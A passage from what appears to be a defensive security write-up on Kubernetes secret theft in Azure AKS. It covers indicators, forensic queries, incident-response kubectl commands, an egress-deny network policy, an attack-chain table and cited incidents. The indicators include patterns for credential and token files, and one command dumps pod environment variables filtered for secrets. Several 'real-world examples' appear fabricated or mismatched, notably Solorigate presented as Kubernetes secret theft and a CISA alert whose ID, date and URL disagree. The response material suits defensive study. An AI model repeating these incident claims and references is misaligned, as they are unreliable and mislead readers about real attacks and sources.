  - Unusual egress on ports 443, 8443 (API server communication)

*   **Files (If pod filesystem is compromised):**
  - `/tmp/*cred*`, `/tmp/*secret*`, `/tmp/*token*`
  - `~/.kube/config` in compromised pod
  - Plaintext secrets in `/var/tmp` or `/dev/shm`

### Forensic Artifacts

*   **Primary Artifact:** Kubernetes audit logs in Azure Log Analytics
  - Query: `AzureDiagnostics | where properties.verb in ("list", "get") and properties.objectRef.resource == "secrets"`
  - Retention: 90 days default (configurable up to 2 years)
  - Fields: user, timestamp, source IP, secret names, namespace

*   **Secondary Artifacts:**
  - Pod logs (if `kubectl logs` is used)
  - Container runtime logs (`/var/log/containers/`)
  - etcd snapshots (if backup is available)

### Response Procedures

1.  **Identify Compromised Pods:**
    **Command:**
    ```bash
    # Find pods that accessed secrets
    kubectl logs <pod-name> | grep -i "secret\|credential"
    
    # Check pod environment variables
    kubectl exec <pod-name> -- env | grep -i "secret\|pass"
    ```
    
    **Manual (Azure Portal):**
    - Go to **Log Analytics Workspace** → **Logs**
    - Query: `AzureDiagnostics | where properties.sourceIPs contains "<pod-ip>"`

2.  **Isolate Compromised Pods:**
    **Command:**
    ```bash
    # Delete compromised pod
    kubectl delete pod <pod-name> -n <namespace>
    
    # Prevent pod recreation by scaling deployment to 0
    kubectl scale deployment <deployment-name> --replicas=0 -n <namespace>
    ```
    
    **Implement Network Policy:**
    ```yaml
    apiVersion: networking.k8s.io/v1
    kind: NetworkPolicy
    metadata:
      name: deny-egress-suspicious-pod
      namespace: production
    spec:
      podSelector:
        matchLabels:
          app: compromised-app
      policyTypes:
      - Egress
      egress: []  # Deny all egress
    ```

3.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export audit logs for forensics
    az monitor log-analytics query \
      --workspace <workspace-id> \
      --analytics-query "AzureDiagnostics | where TimeGenerated > ago(7d)" \
      --output json > forensics_audit.json
    
    # Capture pod logs before deletion
    kubectl logs <pod-name> -n <namespace> > pod_logs_backup.log
    
    # Export pod description and events
    kubectl describe pod <pod-name> -n <namespace> > pod_description.txt
    ```

4.  **Remediate:**
    **Command:**
    ```bash
    # Rotate all secrets that may have been compromised
    kubectl delete secret <secret-name> -n <namespace>
    
    # Update deployment with new secret references
    kubectl apply -f updated-deployment.yaml
    
    # Force restart all pods in affected deployment
    kubectl rollout restart deployment/<deployment-name> -n <namespace>
    
    # Verify new pods are using updated secrets
    kubectl get pods -n <namespace> -o wide
    ```
    
    **Long-Term Remediation:**
    - Implement all mitigations from section 14
    - Conduct full RBAC audit across all namespaces
    - Enable encryption at rest for etcd
    - Implement network policies for egress control
    - Deploy container image scanning to prevent future compromises

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Attacker gains code execution in pod/container |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-004] Container Escape to Host | Attacker escalates from container to host |
| **3** | **Credential Access** | [CONTAINER-001] Kubernetes API Server Compromise | Attacker obtains bootstrap tokens for API access |
| **4** | **Credential Access** | **[CONTAINER-002] Container Orchestration Secret Theft** | **Attacker extracts all cluster secrets and credentials** |
| **5** | **Lateral Movement** | [LM-AUTH-030] AKS Service Account Token Theft | Attacker exfiltrates tokens for remote access |
| **6** | **Persistence** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Attacker deploys persistent backdoor pod |
| **7** | **Impact** | Data exfiltration, infrastructure compromise, ransomware | Complete cluster takeover and business disruption |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Solorigate/SolarWinds Supply Chain Attack
- **Target:** US Government, Fortune 500 companies
- **Timeline:** December 2020
- **Technique Status:** Supply chain compromise led to credential theft from SolarWinds Kubernetes deployments
- **Impact:** Attackers gained access to customer environments and extracted secrets from containerized applications
- **Reference:** [Microsoft Solorigate Blog](https://www.microsoft.com/en-us/security/blog/2020/12/21/advice-for-it-teams-on-managing-the-solorigate-attack/)

#### Example 2: ALPHV/BlackCat Ransomware Kubernetes Targeting (2023)
- **Target:** Multi-industry
- **Timeline:** 2023
- **Technique Status:** Ransomware operators exploited Kubernetes misconfigurations to steal credentials from secrets and ConfigMaps
- **Impact:** Attackers encrypted containerized workloads and demanded ransom after credential theft
- **Reference:** [CISA Alert AA23-352A](https://www.cisa.gov/news-events/alerts/2023/12/18/alphv-blackcat-ransomware-group-claims-responsibility-multiple-change-healthcare)

#### Example 3: AWS EKS Misconfiguration Exposed Database Credentials (2022)
- **Target:** SaaS Provider
- **Timeline:** March 2022
- **Technique Status:** Researchers discovered EKS cluster with overly permissive RBAC, enabling secret enumeration
- **Impact:** Database credentials were stolen; databases were compromised for data exfiltration
- **Reference:** [SecurityWeek: EKS Credential Theft](https://www.securityweek.com/eks-clusters-exposed-to-credential-theft-through-rbac-misconfiguration/)

---